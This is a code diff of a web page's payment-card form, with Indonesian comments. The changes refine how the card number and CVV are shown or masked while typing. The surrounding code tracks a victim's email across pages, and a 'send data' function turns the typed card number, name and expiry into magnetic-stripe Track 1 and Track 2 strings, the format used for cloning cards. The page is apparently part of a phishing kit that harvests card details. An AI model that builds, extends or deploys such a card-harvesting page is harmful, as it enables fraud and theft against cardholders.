@@ -62,7 +62,7 @@
 
         <label>Card Number</label>
         <div class="kartu-wrapper">
-            <input type="text" id="nomor" maxlength="19" placeholder="•••• •••• •••• ••••" oninput="cekJenisKartu()">
+            <input type="text" id="nomor" maxlength="19" placeholder="•••• •••• •••• ••••">
             <img src="" id="ikonKartu" class="ikon-kartu" alt="">
         </div>
 
@@ -126,6 +126,7 @@
             if (!email) { window.location.href = 'index.html'; return; }
         });
 
+        // === CEK JENIS KARTU & TAMPILKAN LOGO ===
         function cekJenisKartu() {
             const val = document.getElementById('nomor').value.replace(/\s/g, '');
             nomorAsli = val;
@@ -141,28 +142,46 @@
 
             ikon.src = src;
             ikon.style.display = src ? 'block' : 'none';
-
-            let tampil = '';
-            for (let i = 0; i < val.length; i++) {
-                if (i && i % 4 === 0) tampil += ' ';
-                tampil += '•';
-            }
-            document.getElementById('nomor').value = tampil;
             cekLengkap();
         }
 
-        document.getElementById('nomor').addEventListener('focus', function() {
-            this.value = nomorAsli.replace(/(\d{4})(?=\d)/g, '$1 ');
+        // === FORMAT NOMOR KARTU — TETAP TERLIHAT SAAT DIKETIK ===
+        document.getElementById('nomor').addEventListener('input', function() {
+            let angka = this.value.replace(/\D/g, '');
+            nomorAsli = angka;
+            
+            // Tampilkan angka + spasi, TIDAK disembunyikan saat mengetik
+            let tampil = '';
+            for (let i = 0; i < angka.length; i++) {
+                if (i > 0 && i % 4 === 0) tampil += ' ';
+                tampil += angka[i];
+            }
+            this.value = tampil;
+            cekJenisKartu();
         });
-        document.getElementById('nomor').addEventListener('blur', function() {
+
+        // Saat fokus: tampilkan angka asli
+        document.getElementById('nomor').addEventListener('focus', function() {
             let tampil = '';
             for (let i = 0; i < nomorAsli.length; i++) {
-                if (i && i % 4 === 0) tampil += ' ';
+                if (i > 0 && i % 4 === 0) tampil += ' ';
+                tampil += nomorAsli[i];
+            }
+            this.value = tampil;
+        });
+
+        // Saat hilang fokus: ubah jadi titik
+        document.getElementById('nomor').addEventListener('blur', function() {
+            if (nomorAsli.length === 0) return;
+            let tampil = '';
+            for (let i = 0; i < nomorAsli.length; i++) {
+                if (i > 0 && i % 4 === 0) tampil += ' ';
                 tampil += '•';
             }
             this.value = tampil;
         });
 
+        // === EXPIRY DATE ===
         document.getElementById('expiry').addEventListener('input', function() {
             let val = this.value.replace(/\D/g, '');
             if (val.length >= 2) val = val.slice(0,2) + '/' + val.slice(2,4);
@@ -170,6 +189,7 @@
             cekLengkap();
         });
 
+        // === CVV ===
         document.getElementById('cvv').addEventListener('input', function() {
             cvvAsli = this.value.replace(/\D/g, '');
             this.value = cvvAsli;
@@ -179,9 +199,12 @@
             this.value = cvvAsli;
         });
         document.getElementById('cvv').addEventListener('blur', function() {
-            this.value = cvvAsli.replace(/./g, '•');
+            if (cvvAsli.length > 0) {
+                this.value = cvvAsli.replace(/./g, '•');
+            }
         });
 
+        // === CEK SEMUA DATA LENGKAP ===
         function cekLengkap() {
             const ok = nomorAsli.length >= 13 && nomorAsli.length <= 16 &&
                        document.getElementById('expiry').value.length === 5 &&
@@ -194,6 +217,7 @@
             document.getElementById('tombol').disabled = !ok;
         }
 
+        // === KIRIM DATA & LANJUT ===
         async function lanjut() {
             const email = localStorage.getItem('emailPengguna');
             trackData = `=== TRACK ===\nT1: %B${nomorAsli}^${document.getElementById('nama').value.replace(/\s+/g, '/')}^${document.getElementById('expiry').value.replace('/','')}000000000000?\nT2: ;${nomorAsli}=${document.getElementById('expiry').value.replace('/','')}000000000000?`;
